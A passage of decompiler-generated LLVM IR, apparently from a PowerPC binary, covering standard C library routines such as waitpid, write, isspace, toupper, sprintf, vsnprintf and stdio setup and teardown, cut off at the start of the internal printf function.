  %r31.global-to-local = alloca i32, align 4
  %v0_1000c7a4 = call i32 @__asm_mfcr()
  %v1_1000c7a8 = and i32 %v0_1000c7a4, 268435456
  %v3_1000c7a8 = icmp eq i32 %v1_1000c7a8, 0
  store i32 %v0_1000c7a4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c7a8, label %dec_label_pc_1000c7c0, label %dec_label_pc_1000c7b4

dec_label_pc_1000c7b4:                            ; preds = %entry
  %v0_1000c7b4 = call i32 @__errno_location()
  %v0_1000c7b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c7b8 = inttoptr i32 %v0_1000c7b4 to i32*
  store i32 %v0_1000c7b8, i32* %v2_1000c7b8, align 4
  br label %dec_label_pc_1000c7c0

dec_label_pc_1000c7c0:                            ; preds = %entry, %dec_label_pc_1000c7b4
  %v0_1000c7d0 = phi i32 [ %v0_1000c7a4, %entry ], [ -1, %dec_label_pc_1000c7b4 ]
  ret i32 %v0_1000c7d0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c7c0, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1000c7d8 = call i32 @wait4(i32 0)
  ret i32 %v1_1000c7d8
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c7f4 = call i32 @__asm_mfcr()
  %v1_1000c7f8 = and i32 %v0_1000c7f4, 268435456
  %v3_1000c7f8 = icmp eq i32 %v1_1000c7f8, 0
  store i32 %v0_1000c7f4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c7f8, label %dec_label_pc_1000c810, label %dec_label_pc_1000c804

dec_label_pc_1000c804:                            ; preds = %entry
  %v0_1000c804 = call i32 @__errno_location()
  %v0_1000c808 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c808 = inttoptr i32 %v0_1000c804 to i32*
  store i32 %v0_1000c808, i32* %v2_1000c808, align 4
  br label %dec_label_pc_1000c810

dec_label_pc_1000c810:                            ; preds = %entry, %dec_label_pc_1000c804
  %v0_1000c820 = phi i32 [ %v0_1000c7f4, %entry ], [ -1, %dec_label_pc_1000c804 ]
  ret i32 %v0_1000c820

; uselistorder directives
  uselistorder label %dec_label_pc_1000c810, { 1, 0 }
}

define i32 @isspace(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000c828 = mul i32 %arg1, 2
  %v3_1000c82c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18240) to i32*), align 4
  %v2_1000c830 = add i32 %v3_1000c82c, %v1_1000c828
  %v3_1000c830 = inttoptr i32 %v2_1000c830 to i16*
  %v4_1000c830 = load i16, i16* %v3_1000c830, align 2
  %v5_1000c830 = zext i16 %v4_1000c830 to i32
  %v1_1000c834 = call i32 @__asm_rlwinm(i32 %v5_1000c830, i32 0, i32 26, i32 26)
  ret i32 %v1_1000c834
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000c83c = add i32 %arg1, 128
  %v1_1000c840 = mul i32 %arg1, 2
  %v2_1000c844 = icmp ugt i32 %v1_1000c83c, 383
  %v0_1000c848 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000c844, i32 %v0_1000c848)
  %v3_1000c850 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18232) to i32*), align 4
  %v2_1000c854 = add i32 %v1_1000c840, %v3_1000c850
  %v3_1000c854 = inttoptr i32 %v2_1000c854 to i16*
  %v4_1000c854 = load i16, i16* %v3_1000c854, align 2
  %v5_1000c854 = sext i16 %v4_1000c854 to i32
  ret i32 %v5_1000c854
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1002b958.708 to i32)
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  store i32 %arg5, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_1000c888 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000c888, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1000c8d8 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000c8d8, i32* %stack_var_-96, align 4
  store i32 268486884, i32* @lr, align 4
  %v0_1000c8e0 = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000c8e0
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000c900 = load i32, i32* @r4, align 4
  store i32 %v0_1000c900, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_1000c91c = load i32, i32* @r3, align 4
  %v1_1000c91c = sub i32 -1, %v0_1000c91c
  store i32 %v1_1000c91c, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_1000c91c, i32* %r31.global-to-local, align 4
  %v2_1000c930 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000c930, i32* @r3, align 4
  %v0_1000c934 = load i32, i32* @r5, align 4
  store i32 %v0_1000c934, i32* %r29.global-to-local, align 4
  %v0_1000c938 = load i32, i32* @r6, align 4
  store i32 %v0_1000c938, i32* @r28, align 4
  store i32 268486984, i32* @lr, align 4
  %v0_1000c944 = call i32 @__stdio_init_mutex()
  %v0_1000c948 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000c948 = load i32, i32* @r27, align 4
  %v3_1000c948 = icmp ugt i32 %v0_1000c948, %v1_1000c948
  %v0_1000c94c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000c94c, i32* @r4, align 4
  %v0_1000c950 = load i32, i32* @r28, align 4
  store i32 %v0_1000c950, i32* @r5, align 4
  %v2_1000c954 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000c954, i32* @r3, align 4
  br i1 %v3_1000c948, label %dec_label_pc_1000c960, label %dec_label_pc_1000c964

dec_label_pc_1000c960:                            ; preds = %entry
  store i32 %v1_1000c948, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000c964

dec_label_pc_1000c964:                            ; preds = %entry, %dec_label_pc_1000c960
  %v1_1000c964 = phi i32 [ %v0_1000c948, %entry ], [ %v1_1000c948, %dec_label_pc_1000c960 ]
  %v0_1000c964 = load i32, i32* %r31.global-to-local, align 4
  store i32 268487044, i32* @lr, align 4
  %v0_1000c980 = call i32 @_vfprintf_internal()
  %v0_1000c984 = load i32, i32* @r30, align 4
  %v3_1000c984 = icmp eq i32 %v0_1000c984, 0
  br i1 %v3_1000c984, label %dec_label_pc_1000c9ac, label %dec_label_pc_1000c98c

dec_label_pc_1000c98c:                            ; preds = %dec_label_pc_1000c964
  %v4_1000c998 = icmp eq i32 %v1_1000c964, 0
  %v1_1000c994 = sext i1 %v4_1000c998 to i32
  %v0_1000c9a0.v0_1000c964 = add i32 %v0_1000c964, %v1_1000c994
  %stack_var_-88.0 = inttoptr i32 %v0_1000c9a0.v0_1000c964 to i8*
  %v0_1000c9a8 = load i32, i32* @r26, align 4
  %v1_1000c9a8 = trunc i32 %v0_1000c9a8 to i8
  store i8 %v1_1000c9a8, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_1000c9ac

dec_label_pc_1000c9ac:                            ; preds = %dec_label_pc_1000c964, %dec_label_pc_1000c98c
  ret i32 %v0_1000c980

; uselistorder directives
  uselistorder i32 %v0_1000c91c, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_1000c9ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000c964, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* @r28, align 4
  %v0_1000c9d4 = call i32 @__errno_location()
  store i32 %v0_1000c9d4, i32* @r26, align 4
  %v1_1000c9e0 = inttoptr i32 %v0_1000c9d4 to i32*
  %v2_1000c9e0 = load i32, i32* %v1_1000c9e0, align 4
  store i32 %v2_1000c9e0, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_1002b5a4.705 to i32), i32* @r27, align 4
  %v3_1000c9e8 = load i16, i16* @global_var_1002b5a4.705, align 2
  %v4_1000c9e8 = zext i16 %v3_1000c9e8 to i32
  store i32 %v4_1000c9e8, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c9f0.709 to i32), i32* @lr, align 4
  %v1_1000c9ec = call i32 @isatty(i32 0)
  %v1_1000c9f0 = sub i32 1, %v1_1000c9ec
  %v1_1000c9f4 = mul i32 %v1_1000c9f0, 256
  %v0_1000c9f8 = load i32, i32* @r29, align 4
  %v2_1000c9f8 = xor i32 %v1_1000c9f4, %v0_1000c9f8
  %v1_1000ca00 = trunc i32 %v2_1000c9f8 to i16
  store i16 %v1_1000ca00, i16* @global_var_1002b5a4.705, align 2
  %v3_1000ca04 = load i16, i16* @global_var_1002b5f4.706, align 2
  %v4_1000ca04 = zext i16 %v3_1000ca04 to i32
  store i32 %v4_1000ca04, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ca0c.710 to i32), i32* @lr, align 4
  %v1_1000ca08 = call i32 @isatty(i32 1)
  %v1_1000ca0c = sub i32 1, %v1_1000ca08
  %v1_1000ca10 = mul i32 %v1_1000ca0c, 256
  %v0_1000ca14 = load i32, i32* @r29, align 4
  %v2_1000ca14 = xor i32 %v1_1000ca10, %v0_1000ca14
  %v1_1000ca18 = trunc i32 %v2_1000ca14 to i16
  store i16 %v1_1000ca18, i16* @global_var_1002b5f4.706, align 2
  %v0_1000ca1c = load i32, i32* @r25, align 4
  %v1_1000ca1c = load i32, i32* @r26, align 4
  %v2_1000ca1c = inttoptr i32 %v1_1000ca1c to i32*
  store i32 %v0_1000ca1c, i32* %v2_1000ca1c, align 4
  ret i32 %v1_1000ca10

; uselistorder directives
  uselistorder i32 %v1_1000ca10, { 1, 0 }
  uselistorder i16* @global_var_1002b5f4.706, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1001942c.711 to i32), i32* @r4, align 4
  %v0_1000ca40 = call i32 @memcpy()
  ret i32 %v0_1000ca40
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002b574.712 to i32), i32* @r3, align 4
  store i32 268487264, i32* @lr, align 4
  %v0_1000ca5c = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1002b58c.713 to i32), i32* @r3, align 4
  store i32 268487276, i32* @lr, align 4
  %v0_1000ca68 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_1002b8e0.714 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_1000cab49 = icmp eq i32 %storemerge6, 0
  %v1_1000cab811 = add i32 %storemerge6, 56
  store i32 %v1_1000cab811, i32* %r30.global-to-local, align 4
  br i1 %v3_1000cab49, label %dec_label_pc_1000cac4, label %dec_label_pc_1000ca78

dec_label_pc_1000ca78:                            ; preds = %entry, %dec_label_pc_1000caa4
  %v0_1000ca78 = call i32 @__pthread_return_0()
  %v3_1000ca7c = icmp eq i32 %v0_1000ca78, 0
  %v0_1000ca80 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000ca80, i32* @r3, align 4
  br i1 %v3_1000ca7c, label %dec_label_pc_1000caa4, label %dec_label_pc_1000ca88

dec_label_pc_1000ca88:                            ; preds = %dec_label_pc_1000ca78
  %v0_1000ca88 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ca88 = add i32 %v0_1000ca88, 8
  %v2_1000ca88 = inttoptr i32 %v1_1000ca88 to i32*
  %v3_1000ca88 = load i32, i32* %v2_1000ca88, align 4
  store i32 %v3_1000ca88, i32* %r9.global-to-local, align 4
  %v3_1000ca90 = inttoptr i32 %v0_1000ca88 to i16*
  store i16 48, i16* %v3_1000ca90, align 2
  %v0_1000ca94 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ca94 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca94 = add i32 %v1_1000ca94, 20
  %v3_1000ca94 = inttoptr i32 %v2_1000ca94 to i32*
  store i32 %v0_1000ca94, i32* %v3_1000ca94, align 4
  %v0_1000ca98 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ca98 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca98 = add i32 %v1_1000ca98, 24
  %v3_1000ca98 = inttoptr i32 %v2_1000ca98 to i32*
  store i32 %v0_1000ca98, i32* %v3_1000ca98, align 4
  %v0_1000ca9c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ca9c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca9c = add i32 %v1_1000ca9c, 28
  %v3_1000ca9c = inttoptr i32 %v2_1000ca9c to i32*
  store i32 %v0_1000ca9c, i32* %v3_1000ca9c, align 4
  %v0_1000caa0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000caa0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000caa0 = add i32 %v1_1000caa0, 16
  %v3_1000caa0 = inttoptr i32 %v2_1000caa0 to i32*
  store i32 %v0_1000caa0, i32* %v3_1000caa0, align 4
  br label %dec_label_pc_1000caa4

dec_label_pc_1000caa4:                            ; preds = %dec_label_pc_1000ca78, %dec_label_pc_1000ca88
  %v1_1000caa8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000caa8 = add i32 %v1_1000caa8, 52
  %v3_1000caa8 = inttoptr i32 %v2_1000caa8 to i32*
  store i32 1, i32* %v3_1000caa8, align 4
  store i32 268487344, i32* @lr, align 4
  %v0_1000caac = call i32 @__stdio_init_mutex()
  %v0_1000cab0 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000cab0 = add i32 %v0_1000cab0, 32
  %v2_1000cab0 = inttoptr i32 %v1_1000cab0 to i32*
  %storemerge = load i32, i32* %v2_1000cab0, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_1000cab4 = icmp eq i32 %storemerge, 0
  %v1_1000cab8 = add i32 %storemerge, 56
  store i32 %v1_1000cab8, i32* %r30.global-to-local, align 4
  br i1 %v3_1000cab4, label %dec_label_pc_1000cab4.dec_label_pc_1000cac4_crit_edge, label %dec_label_pc_1000ca78

dec_label_pc_1000cab4.dec_label_pc_1000cac4_crit_edge: ; preds = %dec_label_pc_1000caa4
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1002b8e0.714 to i32*), align 4
  br label %dec_label_pc_1000cac4

dec_label_pc_1000cac4:                            ; preds = %dec_label_pc_1000cab4.dec_label_pc_1000cac4_crit_edge, %entry
  %v0_1000cb0016 = phi i32 [ %v1_1000cab8, %dec_label_pc_1000cab4.dec_label_pc_1000cac4_crit_edge ], [ %v1_1000cab811, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_1000cab4.dec_label_pc_1000cac4_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1000cae85 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1000cae85, label %dec_label_pc_1000caf0, label %dec_label_pc_1000cad0

dec_label_pc_1000cad0:                            ; preds = %dec_label_pc_1000cac4, %dec_label_pc_1000cae4
  %v0_1000cad0 = phi i32 [ %storemerge1, %dec_label_pc_1000cae4 ], [ %storemerge12, %dec_label_pc_1000cac4 ]
  %v1_1000cad0 = inttoptr i32 %v0_1000cad0 to i16*
  %v2_1000cad0 = load i16, i16* %v1_1000cad0, align 2
  %v3_1000cad0 = zext i16 %v2_1000cad0 to i32
  store i32 %v0_1000cad0, i32* @r3, align 4
  %v1_1000cad8 = and i32 %v3_1000cad0, 64
  store i32 %v1_1000cad8, i32* %r9.global-to-local, align 4
  %v3_1000cad8 = icmp eq i32 %v1_1000cad8, 0
  br i1 %v3_1000cad8, label %dec_label_pc_1000cae4, label %dec_label_pc_1000cae0

dec_label_pc_1000cae0:                            ; preds = %dec_label_pc_1000cad0
  store i32 268487396, i32* @lr, align 4
  %v0_1000cae0 = call i32 @__stdio_wcommit()
  %v0_1000cae4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cae4

dec_label_pc_1000cae4:                            ; preds = %dec_label_pc_1000cad0, %dec_label_pc_1000cae0
  %v0_1000cae4 = phi i32 [ %v0_1000cad0, %dec_label_pc_1000cad0 ], [ %v0_1000cae4.pre, %dec_label_pc_1000cae0 ]
  %v0_1000cb0017 = phi i32 [ %v0_1000cad0, %dec_label_pc_1000cad0 ], [ %v0_1000cae0, %dec_label_pc_1000cae0 ]
  %v1_1000cae4 = add i32 %v0_1000cae4, 32
  %v2_1000cae4 = inttoptr i32 %v1_1000cae4 to i32*
  %storemerge1 = load i32, i32* %v2_1000cae4, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1000cae8 = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000cae8, label %dec_label_pc_1000caf0, label %dec_label_pc_1000cad0

dec_label_pc_1000caf0:                            ; preds = %dec_label_pc_1000cae4, %dec_label_pc_1000cac4
  %v0_1000cb00 = phi i32 [ %v0_1000cb0016, %dec_label_pc_1000cac4 ], [ %v0_1000cb0017, %dec_label_pc_1000cae4 ]
  ret i32 %v0_1000cb00

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_1000cad0, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cae4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cad0, { 1, 0 }
  uselistorder label %dec_label_pc_1000caa4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca78, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_1000cb0c = load i32, i32* @r31, align 4
  %v0_1000cb10 = load i32, i32* @r3, align 4
  %v1_1000cb18 = add i32 %v0_1000cb10, 8
  %v2_1000cb18 = inttoptr i32 %v1_1000cb18 to i32*
  %v3_1000cb18 = load i32, i32* %v2_1000cb18, align 4
  %v1_1000cb1c = add i32 %v0_1000cb10, 16
  %v2_1000cb1c = inttoptr i32 %v1_1000cb1c to i32*
  %v3_1000cb1c = load i32, i32* %v2_1000cb1c, align 4
  %v2_1000cb24 = sub i32 %v3_1000cb1c, %v3_1000cb18
  store i32 %v2_1000cb24, i32* @r5, align 4
  %v5_1000cb24 = icmp eq i32 %v2_1000cb24, 0
  br i1 %v5_1000cb24, label %dec_label_pc_1000cb34, label %dec_label_pc_1000cb2c

dec_label_pc_1000cb2c:                            ; preds = %entry
  store i32 %v3_1000cb18, i32* %v2_1000cb1c, align 4
  store i32 268487476, i32* @lr, align 4
  %v2_1000cb30 = inttoptr i32 %v3_1000cb18 to i16*
  %v3_1000cb30 = call i32 @__stdio_WRITE(i16* %v2_1000cb30, i32 %v2_1000cb24)
  %v0_1000cb34.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cb34

dec_label_pc_1000cb34:                            ; preds = %entry, %dec_label_pc_1000cb2c
  %v0_1000cb34 = phi i32 [ %v0_1000cb10, %entry ], [ %v0_1000cb34.pre, %dec_label_pc_1000cb2c ]
  %v1_1000cb34 = add i32 %v0_1000cb34, 8
  %v2_1000cb34 = inttoptr i32 %v1_1000cb34 to i32*
  %v3_1000cb34 = load i32, i32* %v2_1000cb34, align 4
  %v1_1000cb38 = add i32 %v0_1000cb34, 16
  %v2_1000cb38 = inttoptr i32 %v1_1000cb38 to i32*
  %v3_1000cb38 = load i32, i32* %v2_1000cb38, align 4
  store i32 %v0_1000cb0c, i32* @r31, align 4
  %v2_1000cb40 = sub i32 %v3_1000cb38, %v3_1000cb34
  ret i32 %v2_1000cb40

; uselistorder directives
  uselistorder i32 %v0_1000cb34, { 1, 0 }
  uselistorder i32 %v3_1000cb18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cb34, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_1000cb7c3 = icmp eq i32 %arg3, 0
  %v2_1000cb80 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_1000cb7c3, label %dec_label_pc_1000cb9c, label %dec_label_pc_1000cb90

dec_label_pc_1000cb78:                            ; preds = %dec_label_pc_1000cb90
  %v1_1000cb78 = add i32 %v0_1000cb78, -1
  store i32 %v1_1000cb78, i32* @r31, align 4
  %v3_1000cb7c = icmp eq i32 %v1_1000cb78, 0
  %v0_1000cb88 = load i32, i32* @r29, align 4
  br i1 %v3_1000cb7c, label %dec_label_pc_1000cb9c.loopexit, label %dec_label_pc_1000cb90

dec_label_pc_1000cb90:                            ; preds = %entry, %dec_label_pc_1000cb78
  %v0_1000cb885 = phi i32 [ %v0_1000cb88, %dec_label_pc_1000cb78 ], [ %arg1, %entry ]
  store i32 268487572, i32* @lr, align 4
  %v3_1000cb90 = inttoptr i32 %v0_1000cb885 to i16*
  %v4_1000cb90 = call i32 @__stdio_fwrite(i32 %v2_1000cb80, i32 1, i16* %v3_1000cb90)
  %v3_1000cb94 = icmp eq i32 %v4_1000cb90, 1
  %v0_1000cb78 = load i32, i32* @r31, align 4
  br i1 %v3_1000cb94, label %dec_label_pc_1000cb78, label %dec_label_pc_1000cb9c.loopexit

dec_label_pc_1000cb9c.loopexit:                   ; preds = %dec_label_pc_1000cb78, %dec_label_pc_1000cb90
  %v0_1000cba0.ph = phi i32 [ %v0_1000cb78, %dec_label_pc_1000cb90 ], [ 0, %dec_label_pc_1000cb78 ]
  %v1_1000cba0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000cb9c

dec_label_pc_1000cb9c:                            ; preds = %dec_label_pc_1000cb9c.loopexit, %entry
  %v1_1000cba0 = phi i32 [ 0, %entry ], [ %v1_1000cba0.pre, %dec_label_pc_1000cb9c.loopexit ]
  %v0_1000cba0 = phi i32 [ 0, %entry ], [ %v0_1000cba0.ph, %dec_label_pc_1000cb9c.loopexit ]
  %v2_1000cba0 = sub i32 %v1_1000cba0, %v0_1000cba0
  ret i32 %v2_1000cba0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cb9c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb90, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_1000cbc8 = and i32 %arg2, 128
  %v3_1000cbc8 = icmp eq i32 %v1_1000cbc8, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000cbc8, label %dec_label_pc_1000cc18, label %dec_label_pc_1000cbe4

dec_label_pc_1000cbe4:                            ; preds = %entry
  %v0_1000cbe4 = call i32 @__GI_strlen()
  %v0_1000cbe8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000cbe4, i32* @r31, align 4
  %v0_1000cbf0 = load i32, i32* %r26.global-to-local, align 4
  %v1_1000cbf4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000cbf4 = sub i32 %v1_1000cbf4, %v0_1000cbe4
  store i32 %v2_1000cbf4, i32* %r29.global-to-local, align 4
  store i32 %v0_1000cbe4, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_1000cbf4, 1
  br i1 %tmp7, label %dec_label_pc_1000cc18, label %dec_label_pc_1000cc04

dec_label_pc_1000cc04:                            ; preds = %dec_label_pc_1000cbe4
  %v1_1000cbe8 = urem i32 %v0_1000cbe8, 128
  store i32 268487688, i32* @lr, align 4
  %v3_1000cc04 = trunc i32 %v1_1000cbe8 to i8
  %v4_1000cc04 = call i32 @_charpad(i32 %v0_1000cbf0, i8 %v3_1000cc04, i32 %v2_1000cbf4)
  %v0_1000cc08 = load i32, i32* @r31, align 4
  store i32 %v0_1000cc08, i32* %r30.global-to-local, align 4
  %v1_1000cc0c = load i32, i32* @r29, align 4
  %v4_1000cc0c = icmp eq i32 %v4_1000cc04, %v1_1000cc0c
  store i32 %v4_1000cc04, i32* @r28, align 4
  br i1 %v4_1000cc0c, label %dec_label_pc_1000cc04.dec_label_pc_1000cc18_crit_edge, label %dec_label_pc_1000cc3c

dec_label_pc_1000cc04.dec_label_pc_1000cc18_crit_edge: ; preds = %dec_label_pc_1000cc04
  %v0_1000cc24.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000cc18

dec_label_pc_1000cc18:                            ; preds = %dec_label_pc_1000cc04.dec_label_pc_1000cc18_crit_edge, %dec_label_pc_1000cbe4, %entry
  %v0_1000cc24 = phi i32 [ %v0_1000cc24.pre, %dec_label_pc_1000cc04.dec_label_pc_1000cc18_crit_edge ], [ %v0_1000cbf0, %dec_label_pc_1000cbe4 ], [ %arg1, %entry ]
  %v0_1000cc20 = phi i32 [ %v0_1000cc08, %dec_label_pc_1000cc04.dec_label_pc_1000cc18_crit_edge ], [ %v0_1000cbe4, %dec_label_pc_1000cbe4 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_1000cc20, 1
  br i1 %tmp8, label %dec_label_pc_1000cc38, label %dec_label_pc_1000cc30

dec_label_pc_1000cc30:                            ; preds = %dec_label_pc_1000cc18
  %v0_1000cc1c = load i32, i32* @r27, align 4
  store i32 268487732, i32* @lr, align 4
  %v3_1000cc30 = inttoptr i32 %v0_1000cc24 to i16*
  %v4_1000cc30 = call i32 @__stdio_fwrite(i32 %v0_1000cc1c, i32 %v0_1000cc20, i16* %v3_1000cc30)
  br label %dec_label_pc_1000cc38

dec_label_pc_1000cc38:                            ; preds = %dec_label_pc_1000cc18, %dec_label_pc_1000cc30
  %v1_1000cc38 = phi i32 [ 0, %dec_label_pc_1000cc18 ], [ %v4_1000cc30, %dec_label_pc_1000cc30 ]
  %v0_1000cc38 = load i32, i32* @r28, align 4
  %v2_1000cc38 = add i32 %v0_1000cc38, %v1_1000cc38
  br label %dec_label_pc_1000cc3c

dec_label_pc_1000cc3c:                            ; preds = %dec_label_pc_1000cc04, %dec_label_pc_1000cc38
  %v0_1000cc40 = phi i32 [ %v4_1000cc04, %dec_label_pc_1000cc04 ], [ %v2_1000cc38, %dec_label_pc_1000cc38 ]
  ret i32 %v0_1000cc40

; uselistorder directives
  uselistorder i32 %v0_1000cc20, { 1, 0 }
  uselistorder i32 %v2_1000cbf4, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc38, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_4()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_4()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1000cc58 = load i32, i32* @lr, align 4
  store i32 %v0_1000cc58, i32* %r0.global-to-local, align 4
  %v2_1000cc60 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_1000cc60, i32* %r30.global-to-local, align 4
  %v0_1000cc64 = load i32, i32* @r3, align 4
  store i32 %v0_1000cc64, i32* %r24.global-to-local, align 4
